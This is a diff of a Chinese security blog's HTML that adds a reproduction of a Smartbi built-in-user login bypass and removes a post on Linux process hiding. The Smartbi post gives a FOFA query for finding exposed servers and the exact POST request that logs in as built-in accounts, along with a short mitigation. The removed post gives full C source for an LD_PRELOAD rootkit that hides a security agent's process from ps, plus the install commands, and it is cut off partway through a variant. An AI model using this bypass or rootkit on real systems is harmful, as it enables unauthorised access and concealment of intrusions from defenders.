@@ -255,6 +255,98 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">【漏洞复现】Smartbi内置用户登陆绕过漏洞复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-08-09 19:32:00 / 修改时间：19:33:40" itemprop="dateCreated datePublished" datetime="2023-08-09T19:32:00+08:00">2023-08-09</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="【漏洞复现】Smartbi内置用户登陆绕过漏洞复现"><a href="#【漏洞复现】Smartbi内置用户登陆绕过漏洞复现" class="headerlink" title="【漏洞复现】Smartbi内置用户登陆绕过漏洞复现"></a>【漏洞复现】Smartbi内置用户登陆绕过漏洞复现</h1><p>Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。</p>
+<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p> Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。</p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V7 &lt;= Smartbi &lt;= V10</span><br></pre></td></tr></table></figure>
+
+<h1 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app=&quot;SMARTBI&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192648536.png" alt="image-20230809192648536"></p>
+<h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip/smartbi/vision/RMIServlet</span><br></pre></td></tr></table></figure>
+
+
+
+<p>验证漏洞是否存在如果是如下图则有可能存在</p>
+<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192709105.png" alt="image-20230809192709105"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /smartbi/vision/RMIServlet HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">className=UserService&amp;methodName=loginFromDB&amp;params=[&quot;system&quot;,&quot;0a&quot;]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192758898.png" alt="image-20230809192758898"></p>
+<p>复现成功如上图所示</p>
+<p>请求体中传入的三个参数</p>
+<p>className：必须指定UserService类名methodName：该类调用的方法loginFromDB</p>
+<p>params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造，第二个参数是三个账号默认的密文密码(默认值为0a)</p>
+<p>使用Hackbar插件发送post请求绕过登录</p>
+<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809192820739.png" alt="image-20230809192820739"></p>
+<p>发送请求后，重新刷新页面即可登录后台</p>
+<p><img src="/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91Smartbi%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230809193028682.png" alt="image-20230809193028682"></p>
+<h1 id="缓解方案"><a href="#缓解方案" class="headerlink" title="缓解方案"></a>缓解方案</h1><p>在确认不影响业务的前提下，删除内置的几个账号（public、service、system）。同时如非必要，不要将Smartbi系统开放在互联网上。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/08/09/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E6%B3%9B%E5%BE%AE-e-cology-FileDownloadForOutDoc%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -450,97 +542,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F-%E5%8A%AB%E6%8C%81%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93LD-PRELOAD/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F-%E5%8A%AB%E6%8C%81%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93LD-PRELOAD/" class="post-title-link" itemprop="url">Linux进程隐藏-劫持预加载动态链接库LD_PRELOAD</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-18 17:20:46 / 修改时间：17:21:23" itemprop="dateCreated datePublished" datetime="2023-07-18T17:20:46+08:00">2023-07-18</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Linux进程隐藏-劫持预加载动态链接库LD-PRELOAD"><a href="#Linux进程隐藏-劫持预加载动态链接库LD-PRELOAD" class="headerlink" title="Linux进程隐藏-劫持预加载动态链接库LD_PRELOAD"></a>Linux进程隐藏-劫持预加载动态链接库LD_PRELOAD</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps/top 命令就是在不断的读取/proc/pid 下的文件信息，再显示出来给我看；</span><br><span class="line"></span><br><span class="line">一般先调用 stat() 确认文件状态，再调用 openat() 打开文件句柄，然后 read() 读取内容，最后 close() 关闭；不断重复这一系列动作从而获取进程信息；</span><br><span class="line"></span><br><span class="line">当然这些都是系统调用，并不是 ps 源码中直接调用的，ps 源码直接调用的函数其实是opendir以及readdir，readdir 内部再进行以上这些系统调用。</span><br></pre></td></tr></table></figure>
-
-<p><strong>劫持预加载动态链接库 LD_PRELOAD</strong></p>
-<p>脚本如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* process_to_filter = <span class="string">&quot;YDService&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_dir_name</span><span class="params">(DIR* dirp, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = dirfd(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/self/fd/%d&quot;</span>, fd);</span><br><span class="line">    <span class="keyword">ssize_t</span> ret = readlink(tmp, buf, size);</span><br><span class="line">    <span class="keyword">if</span>(ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a process name given its pid</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_process_name</span><span class="params">(<span class="keyword">char</span>* pid, <span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strspn</span>(pid, <span class="string">&quot;0123456789&quot;</span>) != <span class="built_in">strlen</span>(pid)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;/proc/%s/stat&quot;</span>, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(tmp, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fgets(tmp, <span class="keyword">sizeof</span>(tmp), f) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> unused;</span><br><span class="line">    <span class="built_in">sscanf</span>(tmp, <span class="string">&quot;%d (%[^)]s&quot;</span>, &amp;unused, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_READDIR(dirent, readdir)                                \</span></span><br><span class="line"><span class="meta">static struct dirent* (*original_##readdir)(DIR*) = NULL;               \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">struct dirent* readdir(DIR *dirp)                                       \</span></span><br><span class="line"><span class="meta">&#123;                                                                       \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span>(original_##readdir == NULL) &#123;                                    \</span></span><br><span class="line"><span class="meta">        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span>(original_##readdir == NULL)                                  \</span></span><br><span class="line"><span class="meta">        &#123;                                                               \</span></span><br><span class="line"><span class="meta">            fprintf(stderr, <span class="meta-string">&quot;Error in dlsym: %s\n&quot;</span>, dlerror());         \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    struct dirent* dir;                                                 \</span></span><br><span class="line"><span class="meta">                                                                        \</span></span><br><span class="line"><span class="meta">    while(1)                                                            \</span></span><br><span class="line"><span class="meta">    &#123;                                                                   \</span></span><br><span class="line"><span class="meta">        dir = original_##readdir(dirp);                                 \</span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">if</span>(dir) &#123;                                                       \</span></span><br><span class="line"><span class="meta">            char dir_name[256];                                         \</span></span><br><span class="line"><span class="meta">            char process_name[256];                                     \</span></span><br><span class="line"><span class="meta">            <span class="meta-keyword">if</span>(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \</span></span><br><span class="line"><span class="meta">                strcmp(dir_name, <span class="meta-string">&quot;/proc&quot;</span>) == 0 &amp;&amp;                       \</span></span><br><span class="line"><span class="meta">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \</span></span><br><span class="line"><span class="meta">                strcmp(process_name, process_to_filter) == 0) &#123;         \</span></span><br><span class="line"><span class="meta">                continue;                                               \</span></span><br><span class="line"><span class="meta">            &#125;                                                           \</span></span><br><span class="line"><span class="meta">        &#125;                                                               \</span></span><br><span class="line"><span class="meta">        break;                                                          \</span></span><br><span class="line"><span class="meta">    &#125;                                                                   \</span></span><br><span class="line"><span class="meta">    return dir;                                                         \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line">DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">DECLARE_READDIR(dirent, readdir);</span><br></pre></td></tr></table></figure>
-
-<p>用gcc编译成.so文件,把脚本中的YDService改成想隐藏的进程就行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c -shared -fPIC -o libhello.so</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo /usr/local/lib/libhello.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/ld.so.preload</span><br></pre></td></tr></table></figure>
-
-<p>测试ps是否会访问预加载，发现是加载了。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f ps 2&gt;&amp;1 |grep ld.so.preload</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F-%E5%8A%AB%E6%8C%81%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93LD-PRELOAD/image-20230718171017272.png" alt="image-20230718171017272"></p>
-<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>这个脚本可以根据关键字隐藏进程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"># define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line"># include &lt;stdio.h&gt;</span><br><span class="line"># include &lt;dlfcn.h&gt;</span><br><span class="line"># include &lt;dirent.h&gt;</span><br><span class="line"># include &lt;string.h&gt;</span><br><span class="line"># include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Every process with this name will be excluded</span><br><span class="line"> */</span><br><span class="line">static const char* process_to_filter = &quot;script&quot;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Get a directory name given a DIR* handle</span><br><span class="line"> */</span><br><span class="line">static int get_dir_name(DIR* dirp, char* buf, size_t size)</span><br><span class="line">&#123;</span><br><span class="line">    int fd = dirfd(dirp);</span><br><span class="line">    if(fd == -1) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char tmp[64];</span><br><span class="line">    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);</span><br><span class="line">    ssize_t ret = readlink(tmp, buf, size);</span><br><span class="line">    if(ret == -1) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[ret] = 0;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * Get a process name given its pid</span><br><span class="line"> */</span><br><span class="line">static int get_process_name(char* pid, char* buf)</span><br><span class="line">&#123;</span><br><span class="line">    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    char tmp[256];</span><br><span class="line">    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);</span><br><span class="line"> </span><br><span class="line">    FILE* f = fopen(tmp, &quot;r&quot;);</span><br><span class="line">    if(f == NULL) &#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(fgets(tmp, sizeof(tmp), f) == NULL) &#123;</span><br><span class="line">        fclose(f);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    int unused;</span><br><span class="line">    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void Next(const char* T,int *next)&#123;</span><br><span class="line">    int i=1;</span><br><span class="line">    next[1]=0;</span><br><span class="line">    int j=0;</span><br><span class="line">    while (i&lt;strlen(T)) &#123;</span><br><span class="line">        if (j==0||T[i-1]==T[j-1]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i]=j;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            j=next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">static int KMP(char * S,const char* T)&#123;</span><br><span class="line">    int next[10];</span><br><span class="line">    Next(T,next);</span><br><span class="line">    int i=1;</span><br><span class="line">    int j=1;</span><br><span class="line">    while (i&lt;=strlen(S)&amp;&amp;j&lt;=strlen(T)) &#123;</span><br><span class="line">        if (j==0 || S[i-1]==T[j-1]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            j=next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if (j&gt;strlen(T)) &#123;</span><br><span class="line">        return i-(int)strlen(T);</span><br><span class="line">    &#125;</span><br><span class="line">    return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># define DECLARE_READDIR(dirent, readdir)                                \</span><br><span class="line">static struct dirent* (*original_## readdir)(DIR*) = NULL;               \</span><br><span class="line">                                                                        \</span><br><span class="line">struct dirent* readdir(DIR *dirp)                                       \</span><br><span class="line">&#123;                                                                       \</span><br><span class="line">    if(original_## readdir == NULL) &#123;                                    \</span><br><span class="line">        original_## readdir = dlsym(RTLD_NEXT, # readdir);               \</span><br><span class="line">        if(original_## readdir == NULL)                                  \</span><br><span class="line">        &#123;                                                               \</span><br><span class="line">            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \</span><br><span class="line">        &#125;                                                               \</span><br><span class="line">    &#125;                                                                   \</span><br><span class="line">                                                                        \</span><br><span class="line">    struct dirent* dir;                                                 \</span><br><span class="line">                                                                        \</span><br><span class="line">    while(1)                                                            \</span><br><span class="line">    &#123;                                                                   \</span><br><span class="line">        dir = original_## readdir(dirp);                                 \</span><br><span class="line">        if(dir) &#123;                                                       \</span><br><span class="line">            char dir_name[256];                                         \</span><br><span class="line">            char process_name[256];                                     \</span><br><span class="line">            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \</span><br><span class="line">                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \</span><br><span class="line">                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \</span><br><span class="line">                KMP(process_name, process_to_filter)!=-1) 